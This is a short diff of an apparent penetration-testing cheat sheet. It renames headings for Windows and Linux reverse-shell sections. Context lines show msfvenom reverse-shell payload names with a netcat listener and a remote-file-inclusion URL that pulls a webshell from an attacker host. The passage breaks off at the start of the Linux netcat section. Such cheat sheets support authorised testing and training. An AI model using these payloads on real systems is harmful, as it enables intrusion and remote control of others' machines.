@@ -142,7 +142,7 @@ cf : https://github.com/rapid7/metasploit-framework/issues/9556 <br />
 
 <br />
 
-## Windows Shell
+## Windows Reverse Shell
 ```sh 
 //Non-Staged :  (windows/shell_reverse_tcp) && nc -nlvp 443
 //Staged     : (windows/shell/reverse_tcp) && use exploit/multi/handler
@@ -195,8 +195,9 @@ Browse a remote page and trigger (remote) webshell page. <br />
 http://target.com/?page=http://attackerIP/evil.txt%00
 ```
 
+<br />
 
-## Linux Spawning a Reverse Shell
+## Linux Reverse Shell
 **-Netcat** <br />
 ```sh 
 Target : 
